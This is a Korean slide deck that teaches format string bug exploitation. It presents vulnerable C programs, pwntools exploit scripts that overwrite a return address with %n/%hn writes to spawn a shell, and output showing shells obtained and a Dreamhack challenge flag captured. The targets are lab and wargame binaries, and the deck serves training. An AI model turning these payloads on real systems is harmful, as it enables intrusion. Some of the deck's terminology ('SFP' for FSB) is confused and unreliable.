---
marp: true
---
Format String Bug
# 배경
`scanf`, `fprintf`, `fscanf`, `sprintf`, `sscanf` 등등 포맷 스트링을 인자로 사용한는 함수들이 있음
포맷 스트링을 채울 값들을 레지스터나 스택에서 가져옴
그런데 이들 내부에는 포맷 스트링이 필요로 하는 인자의 개수와 함수에 전달된 인자의 개수를 비교하는 루틴이 없음
그래서 만약 사용자가 포맷 스트링을 입력할 수 있다면, 악의적으로 다수의 인자를 요청하여 레지스터나 스택의 값을 읽어낼 수 있음
다양한 형식지정자를 활용하여 원하는 위치의 스택 값을 읽거나, 스택에 임의 값을 쓰는 것도 가능

---

그러나 일반적으로 개발자들이 `printf`를 사용할 때는 문자열 형식 지정자를 명시적으로 사용하기 때문에 현재는 실제 개발 환경에서는 FSB 취약점이 발생할 확률이 상당히 낮음

일반적으로 SFP는 FULL RELRO에서는 불가능함

---

# 형식지정자
|**형식 지정자**|**설명**|
|---|---|
|d|부호있는 10진수 정수|
|s|문자열|
|x|부호없는 16진수 정수|
|n|인자에 현재까지 사용된 문자열의 길이를 저장|
|p|void형 포인터|

---
# `$`
참조할 인자의 인덱스를 지정
인덱스의 범위를 전달된 인자의 갯수와 비교하지 않음

`printf("%2$d, %1$d\n", 2, 1);`

---

# 읽기
- 레지스터, 스택 
SFP 취약점이 있으면 아래와 같이 레지스터, 스택의 정보를 leak할 수 있음
출력된 값들은 각각 rsi, rdx, rcx, r8, r9, `[rsp]`, `[rsp+8]`,` [rsp+0x10]`, `[rsp+0x18]`, `[rsp+0x20]` 임

```bash
┌──(foo1㉿main-server)-[~/Desktop/kknock/pwnable/FSB_32]
└─$ ./FSB_32_shell 
0xffd328c8
%p %p %p %p %p %p %p    
0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0xa 0xc00000
```

---

- 그 외 임의 주소
`%[n]$s` 의 형식으로 그 주소의 데이터를 재 참조해 읽을 수 있음
```c
// Name: fsb_aar.c
// Compile: gcc -o fsb_aar fsb_aar.c
#include <stdio.h>
const char *secret = "THIS IS SECRET";
int main() {
  char format[0x100];
  printf("Address of `secret`: %p\n", secret);
  printf("Format: ");
  scanf("%[^\n]", format);
  printf(format);
  return 0;
}
```

---

```python
from pwn import *
p = process("./fsb_aar")
p.recvuntil("`secret`: ")
addr_secret = int(p.recvline()[:-1], 16)
fstring = b"%7$s".ljust(8)
fstring += p64(addr_secret)
p.sendline(fstring)
```

---
# 쓰기
포맷 스트링에 임의의 주소를 넣고, `%[n]$n`의 형식 지정자를 사용하면 그 주소에 데이터를 쓸 수 있음
```c
// Name: fsb_aaw.c
// Compile: gcc -o fsb_aaw fsb_aaw.c
#include <stdio.h>
int secret;
int main() {
  char format[0x100];
  printf("Address of `secret`: %p\n", &secret);
  printf("Format: ");
  scanf("%[^\n]", format);
  printf(format);
  printf("Secret: %d", secret);
  return 0;
}
```

---

```python
#!/usr/bin/python3
# Name: fsb_aaw.py
from pwn import *
p = process("./fsb_aaw")
p.recvuntil("`secret`: ")
addr_secret = int(p.recvline()[:-1], 16)
fstring = b"%31337c%8$n".ljust(16)
fstring += p64(addr_secret)
p.sendline(fstring)
print(p.recvall())
```

`%31337c`로 글자 수를 채우는데, 그 글자 수 값이 목표 주소임
`%8$n`으로 입력을 하는데, 앞에 나온 글자 수 만큼을 포멧스트링 인자 인덱스에 있는 주소값에 입력함
이때, 8인 이유는 레지스터 5개 + 해당 포멧스트링이 들어가면서 스택 2개 공간만큼 차지 했기 때문에 총 7개를 사용했기 때문(printf 자체 rdi레지스터 사용 1개 제외)

---
# `%n` 용도
사용자가 입력한 문자열의 길이를 `%n`을 이용해 계산하고, 
그 길이만큼 for 루프를 돌면서 각 문자를 대문자로 변환하는 작업을 수행하는 코드
```c
#include <stdio.h>
#include <string.h>
int main() {
    char input[100];
    int length = 0;
    printf("Enter a string: ");
    fgets(input, sizeof(input), stdin);
    printf("%s%n", input, &length);
    for (int i = 0; i < length; i++) {
        if (input[i] >= 'a' && input[i] <= 'z') {
            input[i] = input[i] - 'a' + 'A';
        }
    }
    printf("Modified string: %s\n", input);
    return 0;
}
```
이렇게 동적으로 길이가 다른 데이터를 처리하기 위해 사용되는 형식지정자임

---
# 예시1(FSB_32_shell)
- 문제 코드
```c
#include <stdio.h>
#include <stdlib.h>

void shell(){
    system("/bin/sh");
}

//int num = 10;

int main(void){
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);

    char buf[200];

    printf("%p\n", buf);
    read(0, buf, 200);
    printf(buf);
    //printf("\n%d", num);
    return 0;
}
//gcc -m32 -mpreferred-stack-boundary=2 -no-pie -fstack-protector -o FSB_32_shell main.c
```

---

- 분석
```sh
┌──(foo1㉿main-server)-[~/Desktop/kknock/pwnable/FSB_32]
└─$ checksec ./FSB_32_shell
[*] '/home/foo1/Desktop/kknock/pwnable/FSB_32/FSB_32_shell'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
Partial RELRO이므로 SFP 가능

`printf(buf);` 형식지정자를 명시하지 않아 SFP 취약점 발생, 실제로 테스트해보면 알 수 있음
```sh
┌──(foo1㉿main-server)-[~/Desktop/kknock/pwnable/FSB_32]
└─$ ./FSB_32_shell 
0xffd328c8
%p %p %p %p %p %p %p    
0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0xa 0xc00000
```

---

main의 ret 위치에 shell()의 주소로 변조하면 됨
이때, SFP를 이용하여 `%1$hn`이와 같은 형태로 변조시킴

%n도 특정 위치에 값을 저장할 수 있게 만들지만, 넣어야하는 값이 1억회 이상의 길이를 가지고 있으므로 더 작은 단위로 나누기 위해 %hn을 사용

아래와 같이 비트마스킹을 통해 주소값을 상위 주소, 하위 주소로 분리함
```python
shell_high_order=(shell_syb>>16)&0xFFFF
shell_low_order=shell_syb&0xFFFF
```

---

- exploit
x86 이므로 아래와 같은 스크립트로 공격할 수 있음
```python
from pwn import *

p=process("./FSB_32_shell")
#p=gdb.debug("./FSB_32_shell")
e=ELF("./FSB_32_shell")
context.log_level='DEBUG'

shell_syb=e.symbols["shell"] #0x080491a6
shell_high_order=(shell_syb>>16)&0xFFFF
shell_low_order=shell_syb&0xFFFF

payload=b''

buf_addr=int(p.recv(11)[2:-1],16)
buf_size=0xd4
payload+=p32(buf_addr+buf_size+2)
payload+=p32(buf_addr+buf_size)

payload+=b'%'+str(shell_high_order-len(payload)).encode()+b'c'  #b'%2044c'
payload+=b'%1$hn'
payload+=b'%'+str(shell_low_order-shell_high_order).encode()+b'c'   #b'%35234c'
payload+=b'%2$hn'

p.send(payload)

p.interactive()
```

---
- 결과
```sh
┌──(foo1㉿main-server)-[~/Desktop/kknock/pwnable/FSB_32]
└─$ python3 exploit.py 
[+] Starting local process './FSB_32_shell': pid 33716
[*] '/home/foo1/Desktop/kknock/pwnable/FSB_32/FSB_32_shell'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Switching to interactive mode
^\x9f\xe0\xff\\x9f\xe0\xff      ...     \\xf7$\xls
exploit.py  FSB_32_shell  FSB_32.zip  main.c
$  
```

---
# 예시2(FSB_EX)
- 문제코드
```c
#include <stdio.h>
#include <stdlib.h>

void shell(){
    system("/bin/sh");
}

int main(void){
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
    char buf[200];
    printf("%p\n", buf);
    read(0, buf, 200);
    printf(buf);
    return 0;
}
//gcc -no-pie -fstack-protector -o FSB_EX main.c
```
---
- 분석
```sh
┌──(foo1㉿main-server)-[~/Desktop/kknock/pwnable/FSB_EX]
└─$ checksec ./FSB_EX
[*] '/home/foo1/Desktop/kknock/pwnable/FSB_EX/FSB_EX'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
이 문제도 x86 문제와 동일한 방식으로 해결할 수 있지만 고려해야 할 몇 가지 문제가 있음

---

일단 주소 표현을 위해 8바이트가 사용됨, 최소 6바이트
이를 해소하기 위해 추가적인 포맷스트링 인자가 넘어가게 할 수도 있지만, 글자 수 표현에서 번거로운 이슈가 많았어서 다른 방법을 찾아야 했음
다음과 같이 하위 주소에 대해서는 그대로 사용하고, 상위 주소의 대해서는 %n으로 처리하여 문제를 해결할 수 있음 
```python
payload+=b'%'+str(shell_high_order).encode()+b'c'  #b'%64c'
payload+=b'%9$n'

payload+=b'%'+str(shell_low_order-shell_high_order).encode()+b'c'   #b'%4604c'
payload+=b'%10$hn'
```

---

또한 x64에서는 바로 스택에 인자가 넘아가는 게 아니라 레지스터에 있는 값을 먼저 참조하기 때문에 원래 6번째 값을 사용해야 하지만, 실제로는 9번째, 혹은 스택의 상황에 따라 그 이상의 값을 사용해야 할 수도 있음
```python
payload+=b'%'+str(shell_high_order).encode()+b'c'  #b'%64c'
payload+=b'%9$n'

payload+=b'%'+str(shell_low_order-shell_high_order).encode()+b'c'   #b'%4604c'
payload+=b'%10$hn'
```

---

실제로 메모리 덤프를 확인해보면, 9(5+4)번째의 오프셋에 실제 주소가 들어있음을 확인할 수 있음
```sh
pwndbg> telescope 10
00:0000│ rsp 0x7ffe368dc530 ◂— 0x6e24392563343625 ('%64c%9$n')
01:0008│-0c8 0x7ffe368dc538 ◂— 0x3125633139333425 ('%4391c%1')
02:0010│-0c0 0x7ffe368dc540 ◂— 0x616161616e682430 ('0$hnaaaa')
03:0018│-0b8 0x7ffe368dc548 —▸ 0x7ffe368dc60a ◂— 0x40 /* '@' */
04:0020│-0b0 0x7ffe368dc550 —▸ 0x7ffe368dc608 —▸ 0x401167 (shell+1) ◂— mov rbp, rsp
05:0028│-0a8 0x7ffe368dc558 ◂— 0x0
... ↓        4 skipped
```

---

또한 스택값이 8의 배수가 되게 만들어줌
`payload+=b'a'*(8-len(payload)%8)`

이렇게 해도 x64에서는 스택정렬 이슈가 발생할 수 있는데, 8바이트 단위로 움직이는 스택에 대해서 함수를 호출, 종료하기 전에 16바이트 단위로 맞춰줘야 하는 이슈임
따라서 ret위치에 shell()을 바로 넣지 않고, ret위치에 다시 ret를 넣고 다음 호출을 shell()을 호출하게 만들면 됨
하지만 SFP 특성상 넣으려고 하는 글자의 길이를 늘릴 수는 있지만, 줄일 수는 없기 때문에 다른 방법을 모색해야 함

---

여기서 일반적으로 shell()을 사용한다고 하면, 당연히 `0x401166` 의 주소를 사용하는 경우가 많음
```sh
pwndbg> disassemble shell 
Dump of assembler code for function shell:
   0x0000000000401166 <+0>:	push   rbp
   0x0000000000401167 <+1>:	mov    rbp,rsp
   ...
   0x000000000040117b <+21>:	ret    
End of assembler dump.
```

그러나 스택정렬 이슈를 해결하기 위해선 pop이나 push가 있는 가젯을 사용할 수도 있겠지만 지금처럼 상황이 받쳐주지 않는다면, `push rbp` 등을 생략한 후 함수의 위치로 이동하여 해결할 수 있음
어차피 `0x0000000000401166 <+0>:	push   rbp` 이 명령어를 지나치고 진행하더라도, 에필로그에서 문제가 있는 것이기 때문에, system이 실행되는 동안은 문제가 없음
따라서 `shell_syb=e.symbols["shell"]+1` 이렇게 애초에 shell()의 주소를 1을 더해서 가져오면 됨 

---

- exploit
```python
from pwn import *

p=process("./FSB_EX")
#p=gdb.debug("./FSB_EX")
e=ELF("./FSB_EX")
context.log_level='DEBUG'

shell_syb=e.symbols["shell"]+1 #0x401166
shell_high_order=(shell_syb>>16)&0xFFFF
shell_low_order=shell_syb&0xFFFF

main_ret=0x40123c
main_high_order=(main_ret>>16)&0xFFFF
main_low_order=main_ret&0xFFFF

payload=b''

buf_addr=int(p.recvline()[2:],16)
buf_size=0xd8


payload+=b'%'+str(shell_high_order).encode()+b'c'  #b'%64c'
payload+=b'%9$n'

payload+=b'%'+str(shell_low_order-shell_high_order).encode()+b'c'   #b'%4604c'
payload+=b'%10$hn'

payload+=b'a'*(8-len(payload)%8)

payload+=p64(buf_addr+buf_size+2)
payload+=p64(buf_addr+buf_size)

#payload = b'a'*8 + payload

p.send(payload)

p.interactive()
```

---

- 결과 
```sh
┌──(foo1㉿main-server)-[~/Desktop/kknock/pwnable/FSB_EX]
└─$ python3 exploit.py 
[+] Starting local process './FSB_EX': pid 33978
[*] '/home/foo1/Desktop/kknock/pwnable/FSB_EX/FSB_EX'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Switching to interactive mode
\xc8aaaa\x1a\xb6\xc07\xfc$    id
uid=1000(foo**1**) gid=1000(foo1) groups=1000(foo1),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),135(lxd),136(sambashare),138(docker)
$  


```

---
# 예시3
[[Dreamhack - basic_Exploitation_003]]
# 문제 코드
```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}
void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(30);
}
void get_shell() {
    system("/bin/sh");
}
int main(int argc, char *argv[]) {
    char *heap_buf = (char *)malloc(0x80);
    char stack_buf[0x90] = {};
    initialize();
    read(0, heap_buf, 0x80);
    sprintf(stack_buf, heap_buf);
    printf("ECHO : %s\n", stack_buf);
    return 0;
}
```

---
# 분석
```sh
┌──(foo1㉿main-server)-[~/Desktop/Dreamhack/basic_exploitation_003]
└─$ checksec basic_exploitation_003
[*] '/home/foo1/Desktop/Dreamhack/basic_exploitation_003/basic_exploitation_003'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

코드에서 힙에 사용자가 입력한 데이터를 입력받은 후 다시 스택에 데이터를 입력받는 형태임
그런데 힙에서 스택으로 이동할 때 sprintf로 출력하게 되는데, 
사용자가 자유롭게 포멧스트링을 넣을 수 있고, partial RELRO이므로 SFP 취약점이 발생

이전에 포멧스트링 관련 취약점을 이용할 때, %hn등으로 나눠서 공격하는 경우가 많았는데,
여기서는  %n과 같은 입력 관련 포맷스트링을 이용하는 것이 아닌, 단순히 오프셋만큼 쓰레기 값을 넣어주는 역할을 하기 위해 포맷스트링을 사용하는 것뿐임

---

따라서 리턴까지의 오프셋만 알아내기만 하면 됨(0xdc)
```sh
pwndbg> telescope 80
00:0000│ esp 0xffffcf48 —▸ 0xffffcf50 ◂— 'aaaaaaaa\n'
01:0004│-09c 0xffffcf4c —▸ 0x804b1a0 ◂— 'aaaaaaaa\n'
02:0008│-098 0xffffcf50 ◂— 'aaaaaaaa\n'
03:000c│-094 0xffffcf54 ◂— 'aaaa\n'
04:0010│-090 0xffffcf58 ◂— 0xa /* '\n' */
05:0014│-08c 0xffffcf5c ◂— 0x0
... ↓        32 skipped
26:0098│ edi 0xffffcfe0 —▸ 0x804b1a0 ◂— 'aaaaaaaa\n'
27:009c│-004 0xffffcfe4 —▸ 0xf7ffcb80 (_rtld_global_ro) ◂— 0x0
28:00a0│ ebp 0xffffcfe8 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 ◂— 0x0
29:00a4│+004 0xffffcfec —▸ 0xf7c21519 (__libc_start_call_main+121) ◂— add esp, 0x10
2a:00a8│+008 0xffffcff0 ◂— 0x1
...
```

---

# exploit
```python
from pwn import *

p=remote("host3.dreamhack.games",23842)
#p=process("./basic_exploitation_003")
#p=gdb.debug("./basic_exploitation_003")
e=ELF("./basic_exploitation_003")
#context.log_level='DEBUG'

get_shell=e.symbols["get_shell"] #0x080491a6

payload=b''
payload+=b'%156c'
payload+=p32(get_shell)

p.send(payload)

p.interactive()
```

---
# 결과
```sh
┌──(foo1㉿main-server)-[~/Desktop/Dreamhack/basic_exploitation_003]
└─$ python3 exploit.py 
[+] Opening connection to host3.dreamhack.games on port 23842: Done
[*] '/home/foo1/Desktop/Dreamhack/basic_exploitation_003/basic_exploitation_003'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Switching to interactive mode
ECHO :      i\x86\x0
$ ls
basic_exploitation_003
flag
$ cat flag
DH{4e6e355c62249b2da3b566f0d575007e}[*] Got EOF while reading in interactive
$  
```

